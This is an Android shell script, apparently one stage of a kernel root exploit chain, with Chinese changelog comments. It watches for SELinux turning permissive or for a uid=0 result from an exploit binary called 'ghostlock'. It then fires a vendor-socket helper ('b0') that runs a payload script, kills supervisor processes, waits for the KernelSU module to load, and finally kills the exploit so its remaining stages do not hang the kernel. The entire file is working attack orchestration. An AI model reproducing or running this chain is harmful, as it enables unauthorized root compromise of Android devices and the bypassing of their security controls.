#!/system/bin/sh
# fire.sh v6 - watch permissive/uid=0 (long window ~55min); fire ksud chain; kill supervisor
#
# v6 (2026-11-02, 13:2x 连续复位事故修复):
#   1) b0 调用加 10s 硬超时 —— 13:23 事故中 b0 卡死在 vendor socket，
#      chain_fired / exploit_killed 两步都没执行，ghostlock 的 W2/W3 修复段
#      在已落地、KSU 已加载的内核上继续跑（fire.sh v6 注释明示的 wedge 场景）。
#      现在无论 b0 是否返回，后续收尾步骤必然执行。
#   2) 去重竞态修复 —— 旧版 .fire.pid 只记 pid：跨 boot 残留 pid 可能命中
#      PID 复用（误判存活），且同秒两次 arm 会都读不到对方 pid（双实例，
#      13:23:25 实测 pid=16828/16840 两条 LANDED）。现在 pidfile 记
#      "pid boot_id"，同 boot 且 /proc/<pid>/cmdline 含 fire.sh 才算存活。
# writes pidfile so ensure_fire can check with kill -0 (pgrep -f self-matches!)
LOG=/data/local/tmp/.fire.log
exec >>$LOG 2>&1

PIDFILE=/data/local/tmp/.fire.pid
BOOTID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
OLD=$(cat $PIDFILE 2>/dev/null)
OLDPID=${OLD%% *}
OLDBOOT=${OLD#* }
if [ -n "$OLDPID" ] && [ "$OLDBOOT" = "$BOOTID" ] \
   && [ -d "/proc/$OLDPID" ] \
   && grep -q "fire.sh" "/proc/$OLDPID/cmdline" 2>/dev/null; then
  echo "=== fire v6 $(date +%T) pid=$$ dedup: watcher pid=$OLDPID alive (same boot) — exit ==="
  exit 0
fi
echo "$$ $BOOTID" > $PIDFILE
echo "=== fire v6 $(date +%T) pid=$$ ==="
i=0
while [ $i -lt 33000 ]; do
  e=$(cat /sys/fs/selinux/enforce 2>/dev/null)
  h=$(tr -d '\000' < /data/local/tmp/.l0 2>/dev/null | tail -c 3000 | grep -ac "uid=0(root)")
  if [ "$e" = "0" ] || [ "${h:-0}" -gt 0 ]; then
    echo "LANDED e=$e u0=$h t=$i $(date +%T)"
    sleep 0.4
    cd /data/local/tmp
    # v6: 硬超时 —— b0 无响应也必须走到 exploit_killed
    timeout 10 ./b0 atcid_vendor_socket "sh /data/local/tmp/one.sh #seedkeeper_client"
    echo "chain_fired rc=$? $(date +%T)"
    echo FIRED > /data/local/tmp/.fired
    for p in $(pgrep -f "id; getenforce; sleep 300" 2>/dev/null); do kill -9 $p 2>/dev/null; done
    echo "supervisors_killed $(date +%T)"
    # v6: wait for the KSU module, then kill the exploit -- its remaining
    # stages (W2/W3 repairs) can wedge the kernel even after root is in.
    n=0
    while [ $n -lt 40 ]; do
      if grep -q kernelsu /proc/modules 2>/dev/null; then break; fi
      sleep 0.5; n=$((n+1))
    done
    # v6: 无论 KSU 是否出现都杀 exploit —— 落地后 W2/W3 是已知 wedge 源
    pkill -9 -f "/data/local/tmp/ghostlock" 2>/dev/null
    pkill -9 -x ghostlock 2>/dev/null
    echo "exploit_killed ksu_wait=${n} $(date +%T)"
    exit 0
  fi
  i=$((i+1))
  sleep 0.1
done
echo "watch_timeout v6 $(date +%T)"
